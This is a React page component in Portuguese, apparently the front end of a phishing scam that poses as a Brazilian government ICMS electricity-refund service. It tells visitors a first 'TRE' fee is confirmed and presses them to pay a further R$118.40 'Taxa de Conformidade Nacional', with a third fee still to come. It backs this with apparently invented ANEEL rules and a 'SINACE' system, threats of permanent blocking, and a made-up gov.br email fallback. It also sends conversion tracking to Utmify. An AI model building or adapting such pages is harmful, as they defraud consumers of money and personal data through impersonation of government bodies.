import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertTriangle, CheckCircle2, Info, Clock, DollarSign, FileText, ReceiptText, HelpCircle, LockKeyhole, Timer, Shield } from "lucide-react";
import { Link, useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import ScrollToTop from "@/components/ScrollToTop";
import { useUserData } from "@/contexts/UserContext";
import { registerTREPayment } from "@/services/UtmifyService";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

const formatarData = (dataString: string) => {
  const data = new Date(dataString);
  return data.toLocaleDateString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

export default function TaxaComplementar() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  const { userData, updateUserData } = useUserData();
  
  // Valor da Taxa de Conformidade Nacional (TCN)
  const VALOR_TAXA_CONFORMIDADE = 118.40;
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [dataAtual, setDataAtual] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  const [dadosSolicitacao, setDadosSolicitacao] = useState({
    nome: "",
    cpf: "",
    valor: "0",
    companhia: "",
    estado: "",
    dataNascimento: "",
    email: "",
    telefone: "",
    agencia: "",
    conta: "",
    pagamentoId: ""
  });
  
  // Obter dados do contexto global
  useEffect(() => {
    // Definir protocolo baseado no CPF
    const cpf = userData.cpf || "";
    if (cpf) {
      setProtocolo(`${cpf.substring(0, 4)}4714${cpf.substring(6, 9)}`);
    }
    
    // Definir data atual e data estimada de pagamento
    const dataHoje = new Date();
    setDataAtual(dataHoje.toLocaleDateString('pt-BR'));
    
    // Definir data do pagamento da primeira taxa
    if (userData.dataPagamento) {
      setDataPagamento(formatarData(userData.dataPagamento));
    } else {
      setDataPagamento(dataHoje.toLocaleDateString('pt-BR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      }));
    }
    
    // Preencher dados da solicitação com base no contexto global
    setDadosSolicitacao({
      nome: userData.nome || "",
      cpf: userData.cpf || "",
      valor: userData.valorRestituicao?.toString() || "0",
      companhia: userData.companhia || "",
      estado: userData.estado || "",
      dataNascimento: userData.dataNascimento || "",
      email: userData.email || "",
      telefone: userData.telefone || "",
      agencia: userData.contaBancaria?.agencia || "",
      conta: userData.contaBancaria?.conta || "",
      pagamentoId: userData.pagamentoId || ""
    });
  }, [userData]);
  
  // Efeito para registrar o evento de PAID da TRE quando o usuário acessa esta página
  useEffect(() => {
    const dispararEventoPagamentoTRE = async () => {
      try {
        // Verificar se temos os dados mínimos necessários
        if (userData.nome && userData.cpf) {
          console.log('[Utmify] Registrando evento de PAID da TAXA TRE (1/3)');
          
          // Montar objeto com dados do usuário
          const dadosUsuario = {
            nome: userData.nome,
            cpf: userData.cpf,
            email: userData.email || `${userData.cpf.substring(0, 3)}xxx${userData.cpf.substring(userData.cpf.length-2)}@restituicao.gov.br`,
            telefone: userData.telefone || "(11) 99999-9999",
            ip: userData.ip || "127.0.0.1"
          };
          
          // Registrar evento de PAID para a TAXA TRE (1/3)
          const response = await registerTREPayment(dadosUsuario, 'paid', userData.pagamentoId);
          
          if (response.success) {
            console.log('[Utmify] Evento de PAID da TAXA TRE registrado com sucesso:', response.data);
          } else {
            console.error('[Utmify] Erro ao registrar evento de PAID da TAXA TRE:', response.error);
          }
        }
      } catch (error) {
        console.error('[Utmify] Erro ao registrar evento de PAID da TAXA TRE:', error);
      }
    };
    
    // Executar a função para registrar o pagamento
    dispararEventoPagamentoTRE();
  }, [userData]); // Executar apenas uma vez quando os dados do usuário estiverem disponíveis
  
  // Função para prosseguir para a página de pagamento da TCN
  const prosseguirParaPagamentoTCN = () => {
    // Atualizar contexto com dados adicionais necessários para a próxima etapa
    updateUserData({
      // Manter dados existentes
      cpf: dadosSolicitacao.cpf,
      nome: dadosSolicitacao.nome,
      valorRestituicao: parseFloat(dadosSolicitacao.valor),
      companhia: dadosSolicitacao.companhia,
      estado: dadosSolicitacao.estado,
      dataNascimento: dadosSolicitacao.dataNascimento,
      email: dadosSolicitacao.email,
      telefone: dadosSolicitacao.telefone,
      
      // Adicionar dados específicos para a próxima etapa
      valorTaxaConformidade: VALOR_TAXA_CONFORMIDADE,
      protocolo: protocolo
    });
    
    // Redirecionar para a página de pagamento da taxa complementar
    setTimeout(() => {
      setLocation('/pagamento-tcn');
    }, 500);
  };
  
  // Calcula valores formatados
  const valorRestituicaoFormatado = formatarMoeda(parseFloat(dadosSolicitacao.valor));
  const valorTaxaConformidadeFormatado = formatarMoeda(VALOR_TAXA_CONFORMIDADE);
  const cpfFormatado = dadosSolicitacao.cpf ? formatarCPF(dadosSolicitacao.cpf) : "";
  
  return (
    <>
      <ScrollToTop />
      <Header />
      <main className="container mx-auto px-2 py-4 min-h-screen">
        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
          {/* Cabeçalho com informações da restituição */}
          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
              <div className="text-left">
                <div className="flex items-center mb-1">
                  <FileText className="mr-2 h-5 w-5 text-white" />
                  <h3 className="font-bold text-lg">Restituição de ICMS</h3>
                </div>
                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
                  <Info size={12} className="mr-1" />
                  Protocolo nº {protocolo}
                </div>
              </div>
              <div className="text-right bg-[#0C4DA2] rounded-md p-3">
                <p className="font-medium text-white text-sm mb-1">Valor aprovado:</p>
                <p className="font-bold text-lg text-white">{valorRestituicaoFormatado}</p>
                <div className="flex items-center justify-end mt-1 text-xs text-white">
                  <Clock size={12} className="mr-1" />
                  <span>Pagamento da TRE: <span className="font-medium">{dataPagamento}</span></span>
                </div>
              </div>
            </div>
          </div>
          
          {/* Alerta de status */}
          <div className="mb-6">
            <div role="alert" className="relative w-full rounded-xl border border-yellow-400 bg-yellow-50 p-4 shadow-sm">
              <div className="flex items-start gap-4">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-yellow-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                  <path d="M12 9v4M12 17h.01M21.73 18l-8-14a2 2 0 0 0-3.46 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3z"/>
                </svg>
                <div className="flex flex-col">
                  <h5 className="text-sm font-semibold text-yellow-800">
                    Status da Restituição:
                    <span className="inline-block bg-yellow-200 text-yellow-900 text-xs font-bold px-2 py-0.5 rounded-md ml-2">
                      EM PROCESSAMENTO
                    </span>
                  </h5>
                  <p className="mt-1 text-sm text-yellow-700">
                    Seu pagamento da <strong>Taxa de Regularização (TRE)</strong> foi confirmado.<br/>
                    Para concluir o processo de liberação, é necessário o pagamento da <strong>Taxa de Conformidade Nacional (TCN)</strong>.
                  </p>
                </div>
              </div>
            </div>
          </div>
          
          {/* Mensagem sobre processo de liberação */}
          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
            <div className="bg-white/20 p-1.5 rounded-md mr-2">
              <ReceiptText className="h-4 w-4" />
            </div>
            PROCESSO DE LIBERAÇÃO DA RESTITUIÇÃO
          </div>
          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
            <div className="space-y-5">
              <div className="flex items-start">
                <div className="bg-green-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <CheckCircle2 className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">1ª ETAPA - Taxa de Regularização Energética (TRE)</p>
                  <p className="text-sm text-gray-600">Você já realizou o pagamento da TRE com sucesso. Seu pedido foi validado e está em processamento.</p>
                  <Badge variant="outline" className="mt-1 bg-green-50 text-green-700 border-green-200">Concluído</Badge>
                </div>
              </div>
              
              <div className="flex items-start">
                <div className="bg-amber-500 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <AlertTriangle className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">2ª ETAPA - Taxa de Conformidade Nacional (TCN)</p>
                  <p className="text-sm text-gray-600">Esta taxa é necessária para validação do seu crédito no Sistema Nacional de Compensações Elétricas (SINACE) e a liberação da sua restituição.</p>
                  <Badge variant="outline" className="mt-1 bg-amber-50 text-amber-700 border-amber-200">Pendente</Badge>
                </div>
              </div>
              
              <div className="flex items-start opacity-60">
                <div className="bg-gray-400 rounded-full p-2 text-white mt-0.5 mr-3 flex-shrink-0">
                  <LockKeyhole className="h-4 w-4" />
                </div>
                <div>
                  <p className="font-semibold text-gray-600">3ª ETAPA - Liberação Acelerada de Restituição (LAR)</p>
                  <p className="text-sm text-gray-500">Opção disponível apenas após quitação da Taxa de Conformidade Nacional (TCN).</p>
                  <Badge variant="outline" className="mt-1 bg-gray-100 text-gray-500 border-gray-300">Bloqueado</Badge>
                </div>
              </div>
            </div>
          </div>
          
          {/* Detalhes da taxa TCN */}
          <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center mb-0">
            <div className="bg-white/20 p-1.5 rounded-md mr-2">
              <DollarSign className="h-4 w-4" />
            </div>
            TAXA DE CONFORMIDADE NACIONAL (TCN)
          </div>
          <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
            <div className="grid grid-cols-1 gap-6">
              {/* Card destacado da Taxa TCN */}
              <div className="bg-gradient-to-r from-amber-50 to-amber-100 p-4 rounded-lg border border-amber-200 shadow-sm">
                <div className="flex items-center mb-3">
                  <div className="bg-amber-500 rounded-full p-2 text-white mr-3 flex-shrink-0">
                    <FileText className="h-5 w-5" />
                  </div>
                  <div>
                    <h3 className="font-bold text-amber-800 text-lg">Taxa de Conformidade Nacional</h3>
                    <p className="text-amber-700 text-sm">2ª Etapa do processo de restituição</p>
                  </div>
                </div>
                
                <div className="bg-white rounded-md p-4 border border-amber-200 mb-4">
                  <div className="flex justify-between items-center mb-3">
                    <span className="text-gray-700 font-medium">Valor da Taxa:</span>
                    <span className="font-bold text-xl text-amber-800">{valorTaxaConformidadeFormatado}</span>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-sm">
                    <div className="flex items-center">
                      <Shield className="h-4 w-4 text-amber-600 mr-1.5 flex-shrink-0" />
                      <span className="text-gray-700">Conformidade obrigatória</span>
                    </div>
                    <div className="flex items-center">
                      <Timer className="h-4 w-4 text-amber-600 mr-1.5 flex-shrink-0" />
                      <span className="text-gray-700">Processamento em até 24h</span>
                    </div>
                    <div className="flex items-center">
                      <CheckCircle2 className="h-4 w-4 text-amber-600 mr-1.5 flex-shrink-0" />
                      <span className="text-gray-700">Validação SINACE</span>
                    </div>
                  </div>
                </div>
                
                <div className="space-y-3">
                  <h4 className="font-semibold text-amber-800 flex items-center">
                    <Info className="h-4 w-4 mr-2" />
                    Objetivo da Taxa de Conformidade Nacional
                  </h4>
                  
                  <p className="text-sm text-amber-700">
                    A Taxa de Conformidade Nacional (TCN) é exigida pela Resolução ANEEL nº 1.042/2022 para validar sua 
                    restituição no Sistema Nacional de Compensações Elétricas (SINACE).
                  </p>
                  
                  <p className="text-sm text-amber-700">
                    Essa taxa garante a transferência legal dos valores entre a concessionária e o consumidor, 
                    assegurando que o crédito seja reconhecido em território nacional e que o processo 
                    de restituição seja registrado no sistema federal.
                  </p>
                  
                  <div className="bg-amber-50 border border-amber-200 rounded-md p-3 mt-3">
                    <p className="text-sm text-amber-800 font-medium">
                      Após o pagamento da TCN, você terá acesso à etapa final do processo, que inclui a 
                      opção de Liberação Acelerada de Restituição (LAR) para recebimento prioritário do seu crédito.
                    </p>
                  </div>
                </div>
              </div>
              
              {/* Destaque de Importância */}
              <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                <div className="flex items-start">
                  <AlertTriangle className="h-5 w-5 text-red-500 mt-0.5 mr-3 flex-shrink-0" />
                  <div>
                    <h4 className="font-bold text-red-700 mb-2">INFORMAÇÃO IMPORTANTE</h4>
                    <p className="text-sm text-red-600">
                      Sem o pagamento da Taxa de Conformidade Nacional (TCN), sua restituição não poderá ser processada 
                      pelo Sistema Nacional de Compensações Elétricas (SINACE).
                    </p>
                    <p className="text-sm text-red-600 mt-2">
                      A ausência desta taxa implica no bloqueio definitivo do crédito no sistema federal, impossibilitando 
                      a liberação dos valores para sua conta bancária.
                    </p>
                  </div>
                </div>
              </div>
              
              {/* Botão para prosseguir */}
              <div className="mt-4">
                <Button 
                  onClick={prosseguirParaPagamentoTCN}
                  className="w-full font-bold py-6 text-lg bg-green-600 hover:bg-green-700 text-white shadow-md"
                >
                  <div className="flex items-center justify-center">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    PAGAR TAXA TCN
                  </div>
                </Button>
                
                <p className="text-center text-xs text-gray-500 mt-3">
                  Ao prosseguir, você será direcionado para a página de pagamento da Taxa de Conformidade Nacional.
                </p>
              </div>
            </div>
          </div>
          
          {/* Seção de FAQ */}
          <div>
            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm flex items-center">
              <HelpCircle className="h-4 w-4 mr-2" />
              PERGUNTAS FREQUENTES
            </div>
            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
              <div className="space-y-4">
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">1. O que é a Taxa de Conformidade Nacional (TCN)?</h3>
                  <p className="text-sm text-gray-600">
                    A TCN é uma taxa obrigatória instituída pela ANEEL para validar restituições de créditos energéticos no 
                    Sistema Nacional de Compensações Elétricas (SINACE), garantindo a transferência legal dos valores entre 
                    a concessionária e o consumidor.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">2. O que acontece se eu não pagar a TCN?</h3>
                  <p className="text-sm text-gray-600">
                    Sem o pagamento da TCN, sua restituição ficará permanentemente bloqueada no sistema federal. 
                    Isso significa que, mesmo tendo pago a TRE anteriormente, seu crédito não poderá ser transferido 
                    para sua conta bancária.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">3. Quanto tempo leva para o processamento após o pagamento da TCN?</h3>
                  <p className="text-sm text-gray-600">
                    Após o pagamento da TCN, seu crédito será processado no SINACE em até 24 horas. Após esse 
                    processamento, você terá acesso à opção de Liberação Acelerada de Restituição (LAR) para 
                    recebimento prioritário do valor.
                  </p>
                </div>
                
                <div>
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">4. A TCN é obrigatória para todos os consumidores?</h3>
                  <p className="text-sm text-gray-600">
                    Sim, conforme a Resolução ANEEL nº 1.042/2022, a TCN é obrigatória para todos os consumidores 
                    que solicitam restituição de valores cobrados indevidamente nas faturas de energia elétrica, 
                    independentemente da concessionária ou estado.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}